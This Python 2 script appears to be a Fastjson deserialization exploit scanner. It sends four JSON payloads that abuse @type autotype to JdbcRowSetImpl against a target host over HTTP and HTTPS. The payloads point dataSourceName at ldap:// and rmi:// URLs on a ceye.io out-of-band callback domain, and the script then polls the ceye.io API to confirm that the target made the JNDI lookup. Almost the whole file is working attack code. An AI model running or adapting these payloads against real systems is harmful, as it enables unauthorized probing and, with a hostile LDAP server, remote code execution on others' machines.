#coding=utf8
import requests
import struct
import time
import os
import ssl

#proxies={}
#proxies={'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
from collections import OrderedDict
header=OrderedDict([('Content-Type','application/json')])

def check_dnslog(target):
    url = 'http://dnslog'
    #print url
    try:
        r = requests.get(url=url, timeout=3)
        print r.content
        if target in r.content:
            #print r.content
            return True
        return False
    except:
        return False


def check_dnslog2(target):
    url = 'http://api.ceye.io/v1/records?token=xxxxxxx&type=dns&filter='+ target[:19]
    #print url
    try:
        r = requests.get(url=url)
        #print r.content
        if 'id' in r.content and 'name' in r.content:
            #print r.content
            return True
        return False
    except:
        return False

def check(host, port, timeout, path='/'):
    #for line in open("url.txt"):
    try:
        if port == '80':
            ssl_port = '443'
        else:
            ssl_port = port
        http_url='http://%s:%s%s' % (host, port, path)
        https_url='https://%s:%s%s' % (host, ssl_port, path)
        data1 = '{"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"x":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://' + host + '-' + port + '.8em7js.ceye.io:1389/Exploit","autoCommit":true}}}'
        data2 = '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://' + host + '-' + port + '.8em7js.ceye.io:1389/Exploit", "autoCommit":true}'
        data3 = '{"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"x":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://' + host + '-' + port + '.8em7js.ceye.io:1389/Exploit","autoCommit":true}}}'
        data4 = '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://' + host + '-' + port + '.8em7js.ceye.io:1389/Exploit", "autoCommit":true}'
        try:
            requests.post(http_url, data=data1,headers=header,timeout=1)
        except Exception,e:
            print("1",e)
            pass
            
        try:
            requests.post(https_url, data=data1,headers=header,timeout=1)
        except Exception,e:
            print("2",e)
            pass
            
        try:
            requests.post(http_url, data=data2,headers=header,timeout=1)
        except Exception,e:
            print("3",e)
            pass
            
        try:
            requests.post(https_url, data=data2,headers=header,timeout=1)
        except Exception,e:
            print("4",e)
            pass
            
        try:
            requests.post(http_url, data=data3,headers=header,timeout=1)
        except Exception,e:
            print("5",e)
            pass
            
        try:
            requests.post(https_url, data=data3,headers=header,timeout=1)
        except Exception,e:
            print("6",e)
            pass
            
        try:
            requests.post(http_url, data=data4,headers=header,timeout=1)
        except Exception,e:
            print("7",e)
            pass
            
        try:
            requests.post(https_url, data=data4,headers=header,timeout=1)
        except Exception,e:
            print("9",e)
            pass

        if check_dnslog2(host):
            print 'Yes'
            return True
        #print line
    except Exception,e:
        #line=line.replace('\n', "")
        print("9",e)

if __name__ == '__main__':
    check('targetdomain', '80', 3, '/路径')
